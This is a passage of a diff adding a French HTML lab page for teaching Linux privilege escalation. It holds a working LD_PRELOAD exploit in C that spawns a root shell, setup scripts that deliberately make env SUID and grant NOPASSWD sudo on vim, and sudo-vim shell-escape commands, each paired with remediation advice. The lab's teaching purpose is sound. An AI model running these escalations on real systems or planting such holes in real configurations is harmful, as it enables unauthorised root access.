+          <li>Les scripts appelés par cron doivent être immutables : <code>chattr +i script.sh</code></li>
+          <li>Utiliser des chemins absolus dans les tâches cron</li>
+          <li>Auditer : <code>find /etc/cron* -perm -o+w</code> (détecte les fichiers cron world-writable)</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- ═══ TAB: LD_PRELOAD ═══ -->
+    <div class="tab-panel" id="tab-ldpreload">
+      <div class="vuln-meta">
+        <span class="vuln-tag tag-difficulty-hard">Difficulté : Avancée</span>
+        <span class="vuln-tag tag-mitre">MITRE ATT&CK T1574.006</span>
+      </div>
+
+      <div class="vuln-section">
+        <h3><span class="icon">📖</span> Théorie — LD_PRELOAD Hijacking</h3>
+        <p>
+          La variable d'environnement <code>LD_PRELOAD</code> force le chargement d'une bibliothèque partagée <em>avant toutes les autres</em>. Si un binaire SUID (ici <code>env</code>) exécute une commande, on peut injecter une bibliothèque malveillante contenant une fonction <code>_init()</code> qui ouvre un shell root.
+        </p>
+        <div class="warning-box">
+          ⚠️ Cette attaque nécessite la <strong>compilation</strong> d'un fichier C. L'environnement doit donc disposer de <code>gcc</code>.
+        </div>
+      </div>
+
+      <div class="vuln-section">
+        <h3><span class="icon">🛠️</span> Mise en place (vuln_ldpreload.sh)</h3>
+        <div class="code-block">
+          <div class="code-header"><span>bash — vuln_ldpreload.sh</span><button class="copy-btn" onclick="copyCode(this)">Copier</button></div>
+          <pre><span class="comment">#!/bin/bash</span>
+<span class="comment"># Copie env dans le chroot et active le bit SUID</span>
+
+<span class="cmd">cp</span> <span class="path">/usr/bin/env</span> <span class="path">/home/jailed/bin/</span>    <span class="comment"># Copie le binaire env</span>
+<span class="cmd">chmod</span> <span class="flag">4755</span> <span class="path">/home/jailed/bin/env</span>    <span class="comment"># SUID root sur env</span></pre>
+        </div>
+      </div>
+
+      <div class="vuln-section">
+        <h3><span class="icon">💀</span> Exploitation</h3>
+        <div class="step-flow">
+          <div class="step-item">
+            <div class="step-marker">1</div>
+            <div class="step-content">
+              <h4>Écrire le code C malveillant</h4>
+              <p>Créer <code>exploit.c</code> avec une fonction <code>_init()</code> qui spawn un shell root.</p>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-marker">2</div>
+            <div class="step-content">
+              <h4>Compiler en bibliothèque partagée (.so)</h4>
+              <p>Utiliser <code>gcc -fPIC -shared</code> pour produire le fichier .so.</p>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-marker">3</div>
+            <div class="step-content">
+              <h4>Injecter via LD_PRELOAD</h4>
+              <p>Lancer <code>env</code> (SUID root) avec la variable pointant vers notre .so.</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header"><span>c — exploit.c</span><button class="copy-btn" onclick="copyCode(this)">Copier</button></div>
+          <pre><span class="comment">/* exploit.c — Bibliothèque malveillante LD_PRELOAD */</span>
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+<span class="comment">/* _init() est appelée automatiquement au chargement de la lib */</span>
+void <span class="cmd">_init</span>() {
+    <span class="cmd">setgid</span>(0);                  <span class="comment">// Forcer GID root</span>
+    <span class="cmd">setuid</span>(0);                  <span class="comment">// Forcer UID root</span>
+    <span class="cmd">system</span>(<span class="string">"/bin/bash"</span>);        <span class="comment">// Ouvrir un shell (avec droits root)</span>
+}</pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header"><span>exploitation</span><button class="copy-btn" onclick="copyCode(this)">Copier</button></div>
+          <pre><span class="comment"># Étape 1 : Compiler la bibliothèque</span>
+<span class="cmd">gcc</span> <span class="flag">-fPIC -shared</span> <span class="flag">-o</span> <span class="path">/tmp/exploit.so</span> exploit.c <span class="flag">-nostartfiles</span>
+<span class="comment">#   -fPIC       → Position Independent Code (obligatoire pour .so)</span>
+<span class="comment">#   -shared     → Produit une bibliothèque partagée</span>
+<span class="comment">#   -nostartfiles → Pas de main(), juste _init()</span>
+
+<span class="comment"># Étape 2 : Injecter et exécuter</span>
+<span class="cmd">env</span> <span class="flag">LD_PRELOAD=</span><span class="path">/tmp/exploit.so</span> /bin/ls
+<span class="comment"># → _init() s'exécute AVANT ls → shell root ✅</span></pre>
+        </div>
+      </div>
+
+      <div class="remed-box">
+        <h4>🛡️ Remédiation</h4>
+        <ul>
+          <li>Ne pas mettre le bit SUID sur <code>env</code> — aucune raison légitime</li>
+          <li>Le linker dynamique ignore <code>LD_PRELOAD</code> pour les binaires SUID par défaut (vérifier <code>/etc/ld.so.preload</code>)</li>
+          <li>Compiler les binaires critiques en <strong>statique</strong> pour éviter les injections .so</li>
+          <li>Restreindre <code>gcc</code> dans les environnements de production</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- ═══ TAB: VIM SUDO ═══ -->
+    <div class="tab-panel" id="tab-vim">
+      <div class="vuln-meta">
+        <span class="vuln-tag tag-difficulty-easy">Difficulté : Facile</span>
+        <span class="vuln-tag tag-mitre">MITRE ATT&CK T1548.003</span>
+      </div>
+
+      <div class="vuln-section">
+        <h3><span class="icon">📖</span> Théorie — Sudo + Vim escape</h3>
+        <p>
+          Si <code>sudo</code> autorise un utilisateur à exécuter <code>vim</code> en tant que root (via <code>sudoers</code>), l'éditeur Vim permet de lancer un shell depuis son mode commande. C'est un « escape to shell » classique, documenté sur <a href="https://gtfobins.github.io/gtfobins/vim/" target="_blank" style="color:var(--accent-cyan);">GTFOBins</a>.
+        </p>
+        <div class="info-box">
+          <strong>Détection :</strong> <code>sudo -l</code> — Liste les commandes autorisées via sudo. Chercher les éditeurs, interpréteurs ou commandes permettant un escape shell.
+        </div>
+      </div>
+
+      <div class="vuln-section">
+        <h3><span class="icon">🛠️</span> Mise en place (setup_jail.sh)</h3>
+        <div class="code-block">
+          <div class="code-header"><span>bash — extrait de setup_jail.sh</span><button class="copy-btn" onclick="copyCode(this)">Copier</button></div>
+          <pre><span class="comment"># Ajout dans /etc/sudoers.d/ : l'utilisateur peut lancer vim en root</span>
+<span class="cmd">echo</span> <span class="string">"user    ALL=(ALL)   NOPASSWD: /usr/bin/vim"</span> \
+  | <span class="cmd">sudo</span> tee <span class="path">/etc/sudoers.d/vuln_vim</span>
+<span class="comment"># NOPASSWD = pas besoin de mot de passe pour sudo vim</span></pre>
+        </div>
+      </div>
+
+      <div class="vuln-section">
+        <h3><span class="icon">💀</span> Exploitation</h3>
+        <div class="step-flow">
+          <div class="step-item">
+            <div class="step-marker">1</div>
+            <div class="step-content">
+              <h4>Vérifier les droits sudo</h4>
+              <p><code>sudo -l</code> → repérer <code>(ALL) NOPASSWD: /usr/bin/vim</code></p>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-marker">2</div>
+            <div class="step-content">
+              <h4>Lancer Vim en root</h4>
+              <p><code>sudo vim</code></p>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-marker">3</div>
+            <div class="step-content">
+              <h4>Escape to shell</h4>
+              <p>Dans Vim, taper <code>:set shell=/bin/bash</code> puis <code>:shell</code></p>
+            </div>
+          </div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header"><span>exploitation</span><button class="copy-btn" onclick="copyCode(this)">Copier</button></div>
+          <pre><span class="comment"># Étape 1 : Vérifier les droits sudo</span>
+<span class="cmd">sudo</span> <span class="flag">-l</span>
+<span class="comment"># → (ALL) NOPASSWD: /usr/bin/vim</span>
+
+<span class="comment"># Étape 2 : Lancer vim en tant que root</span>
+<span class="cmd">sudo</span> <span class="flag">-u root</span> <span class="path">/usr/bin/vim</span>
+
+<span class="comment"># Étape 3 : Dans l'éditeur Vim, taper :</span>
+<span class="danger">:set shell=/bin/bash</span>
+<span class="danger">:shell</span>
+<span class="comment"># whoami → root ✅</span>
+
+<span class="comment"># Alternative en une seule commande :</span>
+<span class="cmd">sudo</span> vim <span class="flag">-c</span> <span class="string">':!/bin/bash'</span></pre>
+        </div>
+      </div>
+
+      <div class="remed-box">
+        <h4>🛡️ Remédiation</h4>
+        <ul>
+          <li>Ne jamais donner <code>sudo</code> sur des éditeurs (vim, nano, less, more, man…)</li>
+          <li>Utiliser <code>sudoedit</code> au lieu de <code>sudo vim</code> pour l'édition de fichiers</li>
+          <li>Consulter <a href="https://gtfobins.github.io" target="_blank" style="color:var(--accent-green);">GTFOBins</a> avant d'ajouter un binaire dans sudoers</li>
+          <li>Appliquer le principe du <strong>moindre privilège</strong> dans sudoers</li>
+        </ul>
+      </div>
+    </div>
+
+  </div><!-- .tabs-wrapper -->
+
+  <!-- ─── 04. NETTOYAGE ─── -->
+  <div class="section-header">
+    <span class="section-num">04</span>
+    <h2>Nettoyage post-TP</h2>
+  </div>
+  <p class="section-desc">
+    Après l'exercice, il est <strong>impératif</strong> de nettoyer l'environnement. Exécuter ces commandes en root sur la VM.
+  </p>
+
+  <div class="cleanup-section">
+    <div class="code-block">
+      <div class="code-header"><span>bash — nettoyage complet</span><button class="copy-btn" onclick="copyCode(this)">Copier</button></div>
+      <pre><span class="comment"># Supprimer l'utilisateur et son répertoire</span>
+<span class="cmd">sudo</span> userdel <span class="flag">-r</span> user
+
+<span class="comment"># Supprimer le groupe SSH chroot</span>
+<span class="cmd">sudo</span> groupdel sshchroot
+
+<span class="comment"># Supprimer l'environnement chrooté</span>
+<span class="cmd">sudo</span> rm <span class="flag">-rf</span> <span class="path">/home/jailed</span>
+
+<span class="comment"># Supprimer la règle sudo vulnérable</span>
+<span class="cmd">sudo</span> rm <span class="path">/etc/sudoers.d/vuln_vim</span>
+
+<span class="comment"># Vérifier qu'aucun binaire SUID résiduel ne traîne</span>
+<span class="cmd">find</span> / <span class="flag">-perm -4000</span> -type f 2>/dev/null
+
+<span class="comment"># Vérifier les tâches cron</span>
+<span class="cmd">ls</span> <span class="flag">-la</span> <span class="path">/etc/cron.d/</span></pre>
+    </div>
+
+    <div class="danger-box">
+      🔴 <strong>Ne jamais laisser</strong> un environnement vulnérable actif au-delà du TP. Snapshot la VM avant, détruire après.
+    </div>
+  </div>
+
+</div><!-- .container -->
+
+<!-- ═══════════════ FOOTER ═══════════════ -->
+<footer>
+  <p>
+    Lab Jail Vulnérable — Usage pédagogique uniquement<br>
+    Créé pour <strong>CONNECT3S</strong> · Réf. ANSSI Guide Hygiène v3 · <a href="https://gtfobins.github.io" target="_blank">GTFOBins</a> · <a href="https://attack.mitre.org" target="_blank">MITRE ATT&CK</a>
+  </p>
+</footer>
+
+<script>
+  // ═══ TAB SWITCHING ═══
+  document.querySelectorAll('.tab-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      const target = btn.dataset.tab;
+
+      // Deactivate all
+      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+      document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+
+      // Activate selected
+      btn.classList.add('active');
+      document.getElementById('tab-' + target).classList.add('active');
+    });
+  });
+
+  // ═══ COPY TO CLIPBOARD ═══
+  function copyCode(button) {
+    const pre = button.closest('.code-block').querySelector('pre');
+    const text = pre.innerText;
+    navigator.clipboard.writeText(text).then(() => {
+      button.textContent = '✓ Copié';
+      button.style.color = 'var(--accent-green)';
+      setTimeout(() => {
+        button.textContent = 'Copier';
+        button.style.color = '';
+      }, 2000);
+    });
+  }
+
+  // ═══ INTERSECTION OBSERVER FOR ANIMATIONS ═══
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        entry.target.style.animation = 'fadeUp 0.6s ease-out forwards';
+        observer.unobserve(entry.target);
+      }
+    });
+  }, { threshold: 0.1 });
+
+  document.querySelectorAll('.section-header, .prereq-card, .tabs-wrapper, .cleanup-section').forEach(el => {
+    el.style.opacity = '0';
+    el.style.transform = 'translateY(20px)';
+    observer.observe(el);
+  });
+</script>
+
+</body>
+</html>
